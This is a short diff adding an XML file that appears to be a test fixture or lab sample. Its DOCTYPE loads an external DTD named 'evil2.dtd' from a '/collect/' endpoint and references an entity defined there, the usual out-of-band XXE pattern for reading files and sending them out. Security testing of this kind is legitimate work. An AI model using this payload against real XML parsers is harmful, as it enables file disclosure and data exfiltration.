@@ -1,0 +1,9 @@
+<?xml version="1.0" ?>
+<!DOCTYPE model [
+        <!ENTITY % asd SYSTEM "http://localhost:8888/collect/dtd/evil2.dtd">
+        %asd;
+        ]>
+<model>
+    <id>4</id>
+    <data>&c;</data>
+</model>
